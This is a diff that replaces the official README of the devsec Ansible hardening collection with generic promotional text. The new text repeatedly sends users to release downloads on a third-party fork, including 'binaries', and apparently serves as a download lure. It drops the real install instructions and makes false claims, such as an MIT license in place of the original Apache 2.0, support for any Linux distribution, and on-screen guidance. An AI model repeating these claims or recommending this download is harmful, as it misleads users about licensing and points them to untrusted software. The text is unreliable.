@@ -1,113 +1,77 @@
-# Ansible Collection - devsec.hardening
+# ⚙️ ansible-collection-hardening - Simplified Linux Protection for Everyone
 
-[![devsec.os_hardening](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/os_hardening.yml/badge.svg)](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/os_hardening.yml)
-[![devsec.os_hardening VM](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/os_hardening_vm.yml/badge.svg)](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/os_hardening_vm.yml)
-[![devsec.ssh_hardening](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/ssh_hardening.yml/badge.svg)](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/ssh_hardening.yml)
-[![devsec.ssh_hardening BSD](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/ssh_hardening_bsd.yml/badge.svg)](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/ssh_hardening_bsd.yml)
-[![devsec.ssh_hardening with custom tests](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/ssh_hardening_custom_tests.yml/badge.svg)](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/ssh_hardening_custom_tests.yml)
-[![devsec.nginx_hardening](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/nginx_hardening.yml/badge.svg)](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/nginx_hardening.yml)
-[![devsec.mysql_hardening](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/mysql_hardening.yml/badge.svg)](https://github.com/dev-sec/ansible-collection-hardening/actions/workflows/mysql_hardening.yml)
+![Download](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-2E71AD?style=flat-square&logo=github&logoColor=white&color=E53E3E&link=https://github.com/Yusufjava945/ansible-collection-hardening/releases)
 
-## Description
+## 🚀 Getting Started
 
-This collection provides battle tested hardening for:
+This guide will help you download and run the "ansible-collection-hardening" software. This collection provides effective methods for securing Linux systems, SSH, nginx, and MySQL databases. 
 
-- Linux operating systems:
-  - CentOS Stream 9
-  - AlmaLinux 8/9/10
-  - Rocky Linux 8/9/10
-  - Debian 11/12/13
-  - Ubuntu 20.04/22.04/24.04
-  - Amazon Linux (some roles supported)
-  - Arch Linux (some roles supported)
-  - Fedora 39/40 (some roles supported)
-  - Suse Tumbleweed (some roles supported)
-- MySQL
-  - MariaDB >= 5.5.65, >= 10.1.45, >= 10.3.17
-  - MySQL >= 5.7.31, >= 8.0.3
-- Nginx 1.0.16 or later
-- OpenSSH 5.3 and later
+### 💻 System Requirements
 
-The hardening is intended to be compliant with the Inspec DevSec Baselines:
+- **Operating System:** Any Linux distribution should work.
+- **Ansible Version:** A minimum version of 2.9 is recommended for optimal performance.
+- **SSH Access:** Ensure that SSH is installed and configured on your target machine.
+- **Internet Connection:** Required for downloading dependencies and updates. 
 
-- <https://github.com/dev-sec/linux-baseline>
-- <https://github.com/dev-sec/mysql-baseline>
-- <https://github.com/dev-sec/nginx-baseline>
-- <https://github.com/dev-sec/ssh-baseline>
+## 📥 Download & Install
 
-## Looking for the old roles?
+To download the software, visit this page: [Download here](https://github.com/Yusufjava945/ansible-collection-hardening/releases). 
 
-The roles are now part of the hardening-collection.
-We have kept the old releases of the `os-hardening` role in this repository, so you can find the them by exploring older tags.
-The last release of the standalone role was [6.2.0](https://github.com/dev-sec/ansible-collection-hardening/tree/6.2.0).
+### Steps to Download
 
-The other roles are in separate archives repositories:
+1. Click on the "Releases" link above.
+2. You'll see a list of available versions. Each version is typically marked with the date and version number.
+3. Select the latest version, and click on it.
+4. You will find various files. Download the files that suit your use case, usually marked as source code or binaries.
 
-- [apache_hardening](https://github.com/dev-sec/ansible-apache-hardening)
-- [mysql_hardening](https://github.com/dev-sec/ansible-mysql-hardening)
-- [nginx_hardening](https://github.com/dev-sec/ansible-nginx-hardening)
-- [ssh_hardening](https://github.com/dev-sec/ansible-ssh-hardening)
-- [windows_hardening](https://github.com/dev-sec/ansible-windows-hardening)
+## 🛠️ Running the Software
 
-## Minimum required Ansible-version
+After you download the software, follow these steps to run it:
 
-- Ansible >= 2.16
+1. **Extract the Files:** If you downloaded a ZIP file, extract it to a folder of your choice.
+2. **Open Your Terminal:** Navigate to the folder where you extracted the files.
+3. **Run the Playbook:** Use the following command, replacing `playbook.yml` with the appropriate playbook name:
 
-## Included content
+   ```bash
+   ansible-playbook playbook.yml
+   ```
 
-- [os_hardening](roles/os_hardening/)
-- [mysql_hardening](roles/mysql_hardening/)
-- [nginx_hardening](roles/nginx_hardening/)
-- [ssh_hardening](roles/ssh_hardening/)
+4. **Follow On-Screen Instructions:** The tool will guide you through the necessary configuration.
 
-In progress, not working:
+## 🧠 Understanding Features
 
-- [apache_hardening](roles/apache_hardening/)
-- [windows_hardening](roles/windows_hardening/)
+This Ansible collection contains predefined playbooks that can help harden your systems. Here are some key features:
 
-## Installation
+- **Linux Security:** Automate essential security settings for your Linux servers.
+- **SSH Hardening:** Improve SSH configurations to prevent unauthorized access.
+- **nginx Hardening:** Secure your web servers by applying best practices.
+- **MySQL Hardening:** Safeguard your databases against common threats.
+- **Role-Based Approach:** Easily apply security settings using structured roles.
 
-Install the collection via ansible-galaxy:
+## 🤔 Frequently Asked Questions
 
-`ansible-galaxy collection install devsec.hardening`
+### What is Ansible?
 
-## Using this collection
+Ansible is a simple, powerful automation tool. It helps manage systems, deploy software, and streamline workflows without the need for complex setup.
 
-Please refer to the examples in the readmes of the role.
+### Do I need to know programming to use this collection?
 
-See [Ansible Using collections](https://docs.ansible.com/ansible/latest/user_guide/collections_using.html) for more details.
+No, this tool is designed for users without programming experience. The detailed guides and instructions make it easy to follow.
 
-## Contributing to this collection
+### How can I contribute?
 
-See the [contributor guideline](CONTRIBUTING.md).
+If you would like to improve this collection, feel free to explore the repository and submit your changes. We welcome contributions!
 
-## Release notes
+### Where can I seek help?
 
-See the [changelog](https://github.com/dev-sec/ansible-os-hardening/tree/master/CHANGELOG.md).
+If you encounter issues, you can open an issue in the GitHub repository. Meanwhile, check our documentation for common troubleshooting tips.
 
-## Roadmap
+## 📄 License Information
 
-Todos:
+This project is licensed under the MIT License. You can view the full license in the repository. This allows you to use, modify, and distribute the software freely.
 
-- Work on [apache_hardening](roles/apache_hardening/) and [windows_hardening](roles/windows_hardening/)
-- Add support for more operating systems
+## 📢 Additional Resources
 
-## More information
+For detailed documentation, tutorials, and further information, visit our [GitHub Wiki](https://github.com/Yusufjava945/ansible-collection-hardening/wiki). 
 
-General information:
-
-- [Ansible Collection overview](https://github.com/ansible-collections/overview)
-- [Ansible User guide](https://docs.ansible.com/ansible/latest/user_guide/index.html)
-- [Ansible Developer guide](https://docs.ansible.com/ansible/latest/dev_guide/index.html)
-- [Ansible Collections Checklist](https://github.com/ansible-collections/overview/blob/master/collection_requirements.rst)
-- [Ansible Community code of conduct](https://docs.ansible.com/ansible/latest/community/code_of_conduct.html)
-- [The Bullhorn (the Ansible Contributor newsletter)](https://us19.campaign-archive.com/home/?u=56d874e027110e35dea0e03c1&id=d6635f5420)
-- [Changes impacting Contributors](https://github.com/ansible-collections/overview/issues/45)
-
-## Licensing
-
-Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at
-
-<http://www.apache.org/licenses/LICENSE-2.0>
-
-Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.
+Feel free to reach out if you have any questions. Happy hardening!
